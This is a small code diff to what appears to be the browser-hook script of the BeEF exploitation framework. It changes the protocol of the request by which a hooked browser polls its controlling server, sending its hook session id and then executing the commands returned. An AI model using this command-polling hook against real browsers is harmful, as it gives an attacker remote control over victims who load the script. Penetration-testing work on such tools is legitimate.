@@ -66,7 +66,7 @@ beef.updater = {
 	get_commands: function(http_response) {
 		try {
 			this.lock = true;
-            beef.net.request('http', 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 1, 'script', function(response) {
+            beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 1, 'script', function(response) {
                 if (response.body != null && response.body.length > 0)
                     beef.updater.execute_commands();
             });
